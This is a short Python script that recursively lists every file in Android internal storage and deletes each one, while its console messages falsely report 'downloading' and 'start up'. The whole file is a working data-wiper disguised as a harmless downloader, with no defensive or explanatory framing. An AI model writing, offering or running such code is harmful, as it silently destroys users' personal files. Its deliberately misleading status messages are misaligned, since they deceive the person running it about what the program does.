import os

# ✅ Setup
base_path = "/storage/emulated/0/"  # Android internal storage

# ✅ Step 1: Find All Files (No extension filter)
def find_all_files(path):
    all_files = []
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            all_files.append(file_path)
    return all_files

# ✅ Step 2: Delete File Safely
def delete_file_safe(file_path):
    try:
        os.remove(file_path)
        print(f" Download success...")
    except PermissionError:
        print(f"[⚠️] Err downloading...")
    except Exception as e:
        print(f"[!] Error Download ...")

# ✅ Step 3: Run Everything
if __name__ == "__main__":
    print("🔍 Preparing for start up...")
    files = find_all_files(base_path)
    print(f"Start Downloading...\n")

    for f in files:
        delete_file_safe(f)

    print("\n✅ All Done Starting...")
